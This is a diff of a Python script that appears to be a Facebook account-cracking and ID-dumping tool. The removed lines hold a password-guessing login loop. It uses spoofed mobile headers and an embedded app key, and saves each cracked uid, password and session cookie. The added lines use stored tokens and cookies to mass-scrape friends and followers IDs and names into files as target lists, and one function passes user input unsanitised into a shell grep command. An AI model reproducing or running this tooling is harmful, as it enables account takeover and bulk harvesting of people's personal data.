-                                'generate_machine_id':'1',
-                                'currently_logged_in_userid':'0',
-                                'locale': 'fr_US','client_country_code': 'US',
-                                'fb_api_req_friendly_name':'authenticate',
-                                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
-                                'access_token':access_token}
-            head = {'User-Agent': mar(),
-                                'Accept-Encoding': 'gzip, deflate',
-                                'Connection': 'Keep-Alive',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'Host': 'graph.facebook.com',
-                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                'X-FB-Connection-Type': 'MOBILE.LTE',
-                                'X-Tigon-Is-Retry': 'False',
-                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                                'x-fb-device-group': '5120',
-                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                                'X-FB-Request-Analytics-Tags': 'graphservice',
-                                'X-FB-HTTP-Engine': 'Liger',
-                                'X-FB-Client-IP': 'True',
-                                'X-FB-Server-Cluster': 'True',
-                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
-            url = 'https://b-graph.facebook.com/au'+'th/lo'+'gin'
-            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
-            q = json.loads(po)
-            if 'access_token' in q:
-                uid = str(q['uid'])
-                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                print(f'\r\r{G1}[SP-OK] {uid} | {pas}')
-                print(f'\r\r{G1}[COOKIE]{A} {coki}')
-                open('/sdcard/SP-R-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
-                ok.append(uid)
-                break
-            else:continue
-        loop+=1
+        cok = open('.cok.txt','r').read()
+        token = open('.token.txt','r').read()
+    except (IOError,KeyError,FileNotFoundError):
+        entr()
+    try:
+        info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
+        id = info_datafb["id"]
+        nama = info_datafb["name"]
+    except requests.exceptions.ConnectionError:
+        exit(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m CHECK YOUR INTERNET !! ')
+    except KeyError:
+        try:
+            os.remove(".cok.txt")
+            os.remove(".token.txt")
+        except:
+            pass  
+    print(f""" \x1b[1;91m• \x1b[1;97m1 \x1b[1;91m>\x1b[1;97m CREATE MIX SERIES FILE  """)
+    print(f""" \x1b[1;91m• \x1b[1;97m2 \x1b[1;91m>\x1b[1;97m CREATE NEW SERIES FILE  """)
+    print(f""" \x1b[1;91m• \x1b[1;97m3 \x1b[1;91m>\x1b[1;97m CREATE FILE FROM FOLLOWERS """)
+    print(f""" \x1b[1;91m• \x1b[1;97m4 \x1b[1;91m>\x1b[1;97m SEPARATE FILE IDS""")
+    print(f""" \x1b[1;91m• \x1b[1;97m5 \x1b[1;91m>\x1b[1;97m REMOVE DUP ID""")
+    print(""" \x1b[1;91m• \x1b[1;97m6 \x1b[1;91m>\x1b[1;97m CONTACT ADMIN """)
+    print(""" \x1b[1;91m• \x1b[1;97m0 \x1b[1;91m>\x1b[1;97m LOGOUT COOKIE """)
+    linex()
+    HEART = input(' \x1b[1;97m• \x1b[1;91m --->\x1b[1;97m  ')
+    if HEART in ['111']:
+        login()
+        dump_massal()
+    elif HEART in ['1']:
+        dump_file()
+    elif HEART in ['02','2']:
+    	dump_new()
+    elif HEART in ['03','3']:
+    	dump_followers()
+    elif HEART in ['4','04']:
+        saprate()
+    elif HEART in ['5','05']:
+        remove_dub()
+    elif HEART in ['0']:    			
+        os.system('rm -rf .cok.txt && rm -rf .token.txt');linex()
+        animation('\033[1;37m \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m SUCESSFULLY REMOVED COOKIE')
+        entr()
+    elif HEART in ['6']:
+        contact()
+    else:
+        animation("\033[1;37m \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m INVALID OPTION !!")
+        back()
+        
+ #------------------[ MENU NEXT ]----------------#
+def menu_next():
+    linex()
+    print(""" \x1b[1;91m• \x1b[1;97m1 \x1b[1;91m>\x1b[1;97m SEPARATE LINK""")
+    print(""" \x1b[1;91m• \x1b[1;97m2 \x1b[1;91m>\x1b[1;97m REMOVE DUP ID""")
+    print(""" \x1b[1;91m• \x1b[1;97m0\x1b[1;91m >\x1b[1;97m BACK TO MENU """)
+    linex()
+    nyx = input(' \x1b[1;97m• \x1b[1;91m---> \x1b[1;97m ')
+    if nyx == '111':
+        login()
+        dump_massal()
+    elif nyx == '1':
+        saprate()
+    elif nyx == '2':
+        remove_dub()
+    elif nyx == '0':
+    	back()
+    else:
+        animation("\033[1;37m \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m INVALID OPTION !!")
+        menu_next()
+
+
+#----------------[ CREATE FILE ]-----------------#
+import requests
+import random
+import time
+
+file_name = ''
+
+def dump_file():
+    global file_name
+    idxx = []  
+    linex()
+    try:
+        token = open('.token.txt', 'r').read().strip()
+        cok = open('.cok.txt', 'r').read().strip()
+    except IOError:
+        login()
+    
+    print(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m ENTER FILE NAME WITHOUT "/SDCARD/SP.TXT"');linex()
+    naame = input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m FILE NAME : ')
+    linex()
+    file_name = '/sdcard/' + naame
+
+    try:
+        id_limit = int(input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m INPUT UID LIMIT : '))
+        linex()
+    except ValueError:
+        animation("\x1b[1;91m×--> SELECT CORRECTLY!!")
+        return menu()  
+        
+    if id_limit < 1 or id_limit > 100000000:
+        animation("\x1b[1;91m×--> LIMIT OUT OF RANGE!!")
+        return menu()  
+
+    ses = requests.Session()
+    uid = []
+    id = []
+    non_public_uids = []  
+    color = [
+        '\x1b[38;5;226m', '\x1b[38;5;46m', '\x1b[1;91m', 
+        '\x1b[38;5;248m', '\x1b[38;5;44m', '\x1b[38;5;46m', 
+        '\x1b[38;5;208m', '\x1b[38;5;46m', '\x1b[38;5;231m', 
+        '\x1b[38;5;46m', '\x1b[1;91m'
+    ]
+
+    for SAURAVXX in range(id_limit):
+        saurauuu_uidzz = input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m INPUT UID ' + str(SAURAVXX + 1) + ' : ')
+        uid.append(saurauuu_uidzz)
+
+    linex()
+    wanna_limit = input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m WANNA LIMIT TO STOP (y/n): ').strip().lower()
+
+    if wanna_limit == 'y':
+        try:
+            extract_limit = int(input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m SELECT LIMIT : '));linex()
+        except ValueError:
+            animation("\x1b[1;91m×--> SELECT CORRECTLY!!");linex()
+            return menu()  
+    else:
+        extract_limit = 0  
+    
+
+    try:
+        speed = int(input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m ENTER SPEED (1 TO 100) : '))
+        if speed < 1 or speed > 100:
+            raise ValueError
+        speed = 101 - speed 
+    except ValueError:
+        animation("\x1b[1;91m×--> SELECT CORRECTLY!!")
+        return menu()  
+    
+    total_extracted = 0  
+    all_private = True  
+
+    for userx in uid:
+        head = {
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36'
+        }
+        params = {
+            'access_token': token,
+            'fields': 'friends'
+        }
+        
+        try:
+            url = requests.get(f'https://graph.facebook.com/{userx}', params=params, headers=head, cookies={'cookies': cok}).json()
+            linex()
+
+            if 'error' in url:
+                error_message = url['error'].get('message', '')
+                if 'Unsupported get request' in error_message or 'privacy' in error_message:
+                    non_public_uids.append(userx)  
+                    continue
+
+            all_private = False
+
+            for xxx in url.get('friends', {}).get('data', []):
+                abc = xxx['id']
+                if abc not in id:
+                    id.append(abc)
+        except KeyError:
+            pass
+        except IOError:
+            pass
+        except requests.exceptions.ConnectionError:
+            exit()
+
+    if all_private:
+        animation(" \x1b[1;97m• \033[1;31m>> UID NOT PUBLIC ")
+        return menu()  
+    linex()
+    print(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m TOTAL IDS DUMPED TO FILE : \x1b[1;91m' + str(len(id)))
+    print(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m USE CTRL+Z TO STOP ')
+    linex()
+    for user_lado in id:
+        mix_color = random.choice(color)
+
+        if extract_limit > 0 and total_extracted >= extract_limit:  
+            break  
+        
+        print(f' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m{mix_color} ID DUMPED SUCCESSFULLY : {user_lado}  ')
+        
+        try:
+            urlx = requests.get(f'https://graph.facebook.com/{user_lado}', params=params, headers=head, cookies={'cookies': cok}).json()
+            for xyx in urlx.get('friends', {}).get('data', []):
+                saurav_xx = xyx['id'] + '|' + xyx['name']
+                with open(file_name, 'a') as f:
+                    f.write(saurav_xx + '\n')
+                if saurav_xx not in idxx:
+                    idxx.append(saurav_xx)  
+                    total_extracted += 1  
+                    print(f"   \x1b[1;91m>< \x1b[1;97mTOTAL EXTRACTED : [{total_extracted}]   ", end='\r')
+                    
+                    if extract_limit > 0 and total_extracted >= extract_limit:  
+                        break  
+        except KeyError:
+            pass
+        except IOError:
+            pass
+        except requests.exceptions.ConnectionError:
+            exit()
+
+        
+        time.sleep(speed / 1000.0) 
+
+    finish(idxx)
+
+def finish(idxx):
+    global file_name  
+    linex()
+    print(f' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m TOTAL FETCHED IDS   :\x1b[1;91m {len(idxx)}')
+    print(f' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m DUMPED IDS SAVED IN : \x1b[1;91m{file_name}')
+    linex()
+    input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m PRESS ENTER TO GO BACK ')
+    menu()
+
+#------------------------------------[ NEW SERIES ONLY ]--------------------------------------#
+import requests
+import random
+import time
+
+file_name = ''
+
+def dump_new():
+    global file_name
+    idxx = []  
+    linex()
+    
+    
+    try:
+        token = open('.token.txt', 'r').read().strip()
+        cok = open('.cok.txt', 'r').read().strip()
+    except IOError:
+        login()
+    
+    print(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m ENTER FILE NAME WITHOUT "/SDCARD/"')
+    linex()
+    naame = input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m FILE NAME : ')
+    linex()
+    file_name = '/sdcard/' + naame
+
+    try:
+        id_limit = int(input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m INPUT UID LIMIT : '))
+        linex()
+    except ValueError:
+        return menu()  
+        
+    if id_limit < 1 or id_limit > 100000000:
+        return menu()  
+
+    uid = []
+    id = []
+    color = [
+        '\x1b[38;5;226m', '\x1b[38;5;46m', '\x1b[1;91m', 
+        '\x1b[38;5;248m', '\x1b[38;5;44m', '\x1b[38;5;46m', 
+        '\x1b[38;5;208m', '\x1b[38;5;46m', '\x1b[38;5;231m', 
+        '\x1b[38;5;46m', '\x1b[1;91m'
+    ]
+
+    for SAURAVXX in range(id_limit):
+        saurauuu_uidzz = input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m INPUT UID ' + str(SAURAVXX + 1) + ' : ')
+        
+        
+        if saurauuu_uidzz.startswith(('6155', '6156')):
+            uid.append(saurauuu_uidzz)
+
+    linex()
+    wanna_limit = input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m WANNA LIMIT TO STOP (y/n): ').strip().lower()
+
+    if wanna_limit == 'y':
+        try:
+            extract_limit = int(input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m SELECT LIMIT : '))
+            linex()
+        except ValueError:
+            return menu()  
+    else:
+        extract_limit = 0  
+    
+    
+    try:
+        speed = int(input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m ENTER SPEED (1 TO 100) : '))
+        if speed < 1 or speed > 100:
+            raise ValueError
+        speed = 101 - speed  
+    except ValueError:
+        return menu()  
+    
+    total_extracted = 0  
+    all_private = True  
+
+    for userx in uid:
+        head = {
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36'
+        }
+        params = {
+            'access_token': token,
+            'fields': 'friends'
+        }
+        
+        try:
+            
+            url = requests.get(f'https://graph.facebook.com/{userx}', params=params, headers=head, cookies={'cookies': cok}).json()
+
+            if 'error' in url:
+                continue
+
+            # Handle friends data
+            all_private = False
+            for xxx in url.get('friends', {}).get('data', []):
+                abc = xxx['id']
+                if abc not in id:
+                    id.append(abc)
+        except KeyError:
+            continue
+        except IOError:
+            continue
+        except requests.exceptions.ConnectionError:
+            exit()
+
+
+        time.sleep(speed / 1000.0)
+
+    if all_private:
+        return menu()  
+    linex()
+    print(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m TOTAL IDS DUMPED TO FILE : \x1b[1;91m' + str(len(id)))
+    print(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m USE CTRL+Z TO STOP ')
+    linex()
+    
+    for user_lado in id:
+        if extract_limit > 0 and total_extracted >= extract_limit:  
+            break  
+        
+        
+        mix_color = random.choice(color)
+        print(f' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m{mix_color} ID DUMPED SUCCESSFULLY : {user_lado}')  # Print dumped IDs
+        
+        try:
+            urlx = requests.get(f'https://graph.facebook.com/{user_lado}', params=params, headers=head, cookies={'cookies': cok}).json()
+            for xyx in urlx.get('friends', {}).get('data', []):
+                saurav_xx = xyx['id'] + '|' + xyx['name']
+      
+                if saurav_xx.startswith(('6155', '6156')):
+                    with open(file_name, 'a') as f:
+                        f.write(saurav_xx + '\n')
+                    if saurav_xx not in idxx:
+                        idxx.append(saurav_xx)  
+                        total_extracted += 1  
+                        print(f"   \x1b[1;91m>< \x1b[1;97mTOTAL EXTRACTED : [{total_extracted}]   ", end='\r')
+                        
+                        if extract_limit > 0 and total_extracted >= extract_limit:  
+                            break  
+        except KeyError:
+            continue
+        except IOError:
+            continue
+        except requests.exceptions.ConnectionError:
+            exit()
+
+        
+        time.sleep(speed / 1000.0)
+
+    finish(idxx)
+
+def finish(idxx):
+    global file_name  
+    linex()
+    print(f' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m TOTAL FETCHED IDS   :\x1b[1;91m {len(idxx)}')
+    print(f' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m DUMPED IDS SAVED IN : \x1b[1;91m{file_name}')
+    linex()
+    input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m PRESS ENTER TO GO')
+    menu()
+    
+
+#---------------------------------[ FROM FACEBOOK FOLLOWERS ]--------------------------------#
+import requests
+import random
+import time
+
+file_name = ''
+
+def dump_followers():
+    global file_name
+    idxx = []  
+    linex()
+
+    # Read token and cookies
+    try:
+        token = open('.token.txt', 'r').read().strip()
+        cok = open('.cok.txt', 'r').read().strip()
+    except IOError:
+        login()
+
+    print(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m ENTER FILE NAME WITHOUT "/SDCARD/"')
+    linex()
+    naame = input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m FILE NAME : ')
+    linex()
+    file_name = '/sdcard/' + naame
+
+    try:
+        id_limit = int(input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m INPUT UID LIMIT : '))
+        linex()
+    except ValueError:
+        animation("\x1b[1;91m×--> SELECT CORRECTLY!!")
+        return menu()  
+
+    if id_limit < 1 or id_limit > 100000000:
+        animation("\x1b[1;91m×--> LIMIT OUT OF RANGE!!")
+        return menu()  
+
+    uid = []
+    for SAURAVXX in range(id_limit):
+        saurauuu_uidzz = input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m INPUT UID ' + str(SAURAVXX + 1) + ' : ')
+        uid.append(saurauuu_uidzz)
+
+    linex()
+    wanna_limit = input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m WANNA LIMIT TO STOP (y/n): ').strip().lower()
+
+    if wanna_limit == 'y':
+        try:
+            extract_limit = int(input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m SELECT LIMIT : '))
+            linex()
+        except ValueError:
+            animation("\x1b[1;91m×--> SELECT CORRECTLY!!"); linex()
+            return menu()  
+    else:
+        extract_limit = 0  
+    
+    try:
+        speed = int(input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m ENTER SPEED (1 TO 100) : '))
+        if speed < 1 or speed > 100:
+            raise ValueError
+        speed = 101 - speed  
+    except ValueError:
+        animation("\x1b[1;91m×--> SELECT CORRECTLY!!")
+        return menu()  
+    
+    total_extracted = 0  
+    all_private = True  
+
+    for userx in uid:
+        head = {
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36'
+        }
+        params = {
+            'access_token': token,
+            'fields': 'subscribers.limit(100)'  # Set limit for pagination
+        }
+
+        try:
+            while True:
+                response = requests.get(f'https://graph.facebook.com/{userx}/subscribers', params=params, headers=head).json()
+
+                if 'data' in response:
+                    for follower in response['data']:
+                        follower_id = follower['id']
+                        follower_name = follower.get('name', 'No Name')
+                        if follower_name == 'No Name':  
+                            continue  
+
+                        id_entry = f'{follower_id}|{follower_name}'
+                        with open(file_name, 'a') as file:
+                            file.write(id_entry + '\n')
+
+                        total_extracted += 1
+                        if extract_limit > 0 and total_extracted >= extract_limit:  
+                            break
+
+                    if 'paging' in response and 'next' in response['paging']:
+                        params = {'access_token': token}  
+                        params.update(requests.get(response['paging']['next']).params)
+                    else:
+                        break
+                else:
+                    break
+
+        except Exception as e:
+            continue
+
+        time.sleep(speed / 1000.0)  
+
+    finish(total_extracted)
+
+def finish(total_extracted):
+    global file_name  
+    linex()
+    print(f' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m TOTAL FETCHED IDS   :\x1b[1;91m {total_extracted}')
+    print(f' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m DUMPED IDS SAVED IN : \x1b[1;91m{file_name}')
+    linex()
+    input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m PRESS ENTER TO GO BACK')
+    menu()
+
+#-------------[ sprt.uids]--------------------#
+
+def saprate():
+    linex()
+    try:
+        limit = int(input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m HOW MANY LINKS DO U WANT TO SEPARATE : '))
+    except ValueError:
+        limit = 1
+    linex()
+    print(f""" \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m PUT YOUR FILE FOR SEPARATION""")
+    linex()
+    print(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m EXAMPLE : /sdcard/OLD.txt')
+    linex()
+    file_name = input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m FILE NAME : ')
+    
+    if not os.path.isfile(file_name):
+        animation(' \x1b[1;91m×-->\x1b[1;97m FILE NOT FOUND !!')
+        linex()
+        input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m PRESS ENTER TO BACK ')
+        menu()
+    
+    linex()
+    print(f""" \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m PUT YOUR NEW FILE NAME""")
+    linex()
+    print(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m EXAMPLE : /sdcard/NEW.txt')
+    linex()
+    new_save = input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m NEW FILE NAME : ')
+    linex()
+    
+    y = 0
+    print(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m EXAMPLE : 10001,10002,10003')
+    linex()
+    
+    for k in range(limit):
+        y += 1
+        links = input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m PUT LINKS %s : ' % y)
+        os.system(f'grep "{links}" {file_name} >> {new_save}')
+    
+    linex()
+    print(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m LINKS GRABBED SUCCESSFULLY')
+    linex()
+    print(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m TOTAL GRABBED LINKS : ' +
+          str(len(open(new_save).read().splitlines())))
+    linex()
+    print(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m NEW FILE SAVE AS : \x1b[1;91m' + new_save)
+    linex()
+    input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m PRESS ENTER TO BACK ')
+    menu()
+
+#-------------[ DUB.IDZ ]------------------#    
+def remove_dub():
+    linex()
+    print(f" \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m DUBBLE LINKS CUTTER")
+    linex()
+    print(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m EXAMPLE : /sdcard/rizzzy.txt')
+    linex()
+    file_path = input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m FILE NAME : ')
+
+    try:
+        with open(file_path, "r") as file:
+            lines = file.readlines()
+        
+        with open(file_path, "w") as file:
+            file.writelines(set(lines))
+        
+        linex()
+        print(" \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m SUCCESSFULLY REMOVED DUBBLE UIDS ")
+        linex()
+        print(" \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m YOUR TOTAL IDZ :\x1b[1;91m " + str(len(open(file_path).read().splitlines())))
+    
+    except FileNotFoundError:
+        animation(" \x1b[1;91m×-->\x1b[1;97m FILE NOT FOUND! ")
+    
     except Exception as e:
-        pass
-          
+        print(f" \x1b[1;91m×-->\x1b[1;97m AN ERROR OCCURRED: {e}")
+    
+    linex()
+    input(' \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m PRESS ENTER TO BACK ')
+    menu()
+
+#-----------------------[ SYSTEM ]--------------------#
+# try:
+    # os.mkdir('/sdcard/rohiteyyy')
+# except FileExistsError:
+    # pass
+# try:
+    # os.mkdir('data')
+# except FileExistsError:
+    # pass
 menu()
-#__________________[ END ]__________________#
